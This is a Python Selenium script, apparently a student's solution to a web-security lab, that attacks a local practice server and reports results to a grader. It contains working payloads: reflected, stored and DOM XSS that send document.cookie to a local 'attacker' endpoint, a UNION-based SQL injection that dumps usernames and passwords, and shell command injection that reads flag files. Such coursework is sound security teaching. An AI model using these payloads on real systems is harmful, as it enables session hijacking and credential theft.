from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import base64
import grader

# NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'

def xss(vuln_type, level):
    # TODO remove this if statement
    if(vuln_type != '3'):
        return
    if(level != 'low' and level != 'medium' and level != 'high'):
        return

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options) # Starts the browser

    # driver.get(TARGET_SERVER_ENDPOINT) # Makes a request to the specified URL.

    # DO SOMETHING

    # Reflected XSS
    if vuln_type == '1' and level == 'low':
        url = "http://localhost:1337/xss/1/low?comment=%22%3Cscript%3Evar%20cookie=document.cookie;$.ajax({url:%20%22http://localhost:1338/xss/reflected_low?cookie=%22.concat(cookie)});%3C/script%3E%22"
        driver.get(url)
    elif vuln_type == '1' and level == 'medium':
        url = "http://localhost:1337/xss/1/medium?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_medium?cookie=%22.concat(document.cookie)})%3E"
        driver.get(url)
    elif vuln_type == '1' and level == 'high':
        url = "http://localhost:1337/xss/1/high?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_high?cookie=%22.concat(document.cookie)})%3E"
        driver.get(url)

    # Stored XSS
    if vuln_type == '2' and level == 'high':
        url = 'http://localhost:1337/xss/2/high?comment=<svg onload=$.ajax({url:"http://localhost:1338/xss/stored_high?cookie=".concat(document.cookie)});></svg>'
        driver.get(url)

    elif vuln_type == '2' and level == 'low':
        url = "http://localhost:1337/xss/2/low?comment=%22%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/stored_low?cookie=%22.concat(document.cookie)});%3C/script%3E%22"
        driver.get(url)

    elif vuln_type == '2' and level == 'medium':
        url = 'http://localhost:1337/xss/2/medium?comment=<body onload=$.ajax({url:"http://localhost:1338/xss/stored_medium?cookie=".concat(document.cookie)});></body>'
        driver.get(url)
        # pass

    # DOM Elements
    if vuln_type == '3' and level == 'low':
        url = 'http://localhost:1337/xss/3/low?lang=%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/DOM_low?cookie=%22.concat(document.cookie)})%3C/script%3E'
        driver.get(url)
    elif vuln_type == '3' and level == 'medium':
        url = 'http://localhost:1337/xss/3/medium?lang=%3Cbody%20onload=$.ajax({url:%22http://localhost:1338/xss/DOM_medium?cookie=%22.concat(document.cookie)});%3E%3C/body%3E'
        driver.get(url)
    elif vuln_type == '3' and level == 'high':
        url = 'http://localhost:1337/xss/3/high?lang=%3Cbody%20onload=$.ajax({url:%22http://localhost:1338/xss/DOM_high?cookie=%22.concat(document.cookie)});%3E%3C/body%3E'
        driver.get(url)

    # Grader verification should be done in attacker_server/server.py

    driver.quit() # Closes the browser

def sql():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # URL to get passwords http://localhost:1337/sql_injection/low/id/1'%20or%20'1'%20=%20'1'%20union%20select%20id,%20name,%20surname,%20password%20from%20'users
    url = "http://localhost:1337/sql_injection/low/id/1'%20or%20'1'%20=%20'1'%20union%20select%20id,%20name,%20surname,%20password%20from%20'users"
    driver.get(url)

    soup = BeautifulSoup(driver.page_source) # Get the page contents and use for parsing.
    tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.

    # hard coding this because too lazy to make generic solution
    passwords = []
    usernames = []
    for ind, row in enumerate(tr_elements):
        if(ind == 1 or ind == 3 or ind == 6):
            splt = str(row).split()
            password = splt[4]
            password = password.replace('<td>', '')
            password = password.replace('</td>', '')
            passwords.append(password)
        if(ind == 2 or ind == 4 or ind == 5):
            splt = str(row).split()
            username=splt[2]
            username = username.replace('<td>', '')
            username = username.replace('</td>', '')
            usernames.append(username)

    # TODO: Populate the user_pass_list
    user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
    # eg. [['username', 'password']]
    for x in range(len(usernames)):
        user_pass_list.append([usernames[x], passwords[x]])

    grader.sql_verify('low', user_pass_list)

    driver.quit()

def command_injection(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # ASSUMING SERVER IS RUN FROM STUDENT DIRECTORY
    if level == 'low':
        url = "http://localhost:1337/command_injection/low?ip=example.com;cat%20./server/flags/low.txt%20|%20base64%20-d"
        driver.get(url)
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        output = soup.find(id='output')
        # print(output)
        # Hard coding this because too lazy for generic solution
        splt = str(output).split('\n')
        flag = splt[-2]
        flag = flag.replace('<br/>', '')
        flag = flag.strip()
    if level == 'medium':
        url = "http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/medium.txt%20|%20base64%20-d"
        driver.get(url)
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        output = soup.find(id='output')
        # print(output)
        # Hard coding this because too lazy for generic solution
        splt = str(output).split('\n')
        flag = splt[-2]
        flag = flag.replace('<br/>', '')
        flag = flag.strip()

    if level == 'high':
        url = "http://localhost:1337/command_injection/high?ip=;cat%3C./server/flags/high.txt"
        driver.get(url)
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        output = soup.find(id='output')
        # print(output)
        # Hard coding this because too lazy for generic solution
        splt = str(output).split('\n')
        flag64 = splt[-2]
        flag64 = flag64.replace('<br/>', '')
        flag64 = flag64.strip()
        flag = str(base64.b64decode(flag64), 'utf-8')

    # NOTE: Remember to decode the flag before sending it to the grader.
    grader.command_injection_verify(level, flag)

    driver.quit()

def csrf(level):

    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    # Do the requests and decoding
    if(level == 'low'):
        pass
    # grader.csrf_verify(level, secret_msg, comments) # where secret_msg is the expected comment in the database from your attack.

    driver.quit()

if __name__ == '__main__':

    # NOTE: Feel free to modify the code here for your own purposes.
    # The code below can be used as an example.

    # Commenting out this code until this piece is implemented
    # for level in ['low', 'medium', 'high']:
        # command_injection(level)
    #
    # sql()

    for vuln_type in ['1', '2', '3']:
        for level in ['low', 'medium', 'high']:
            xss(vuln_type, level)

    # for level in ['low', 'medium', 'high']:
    #     csrf(level)
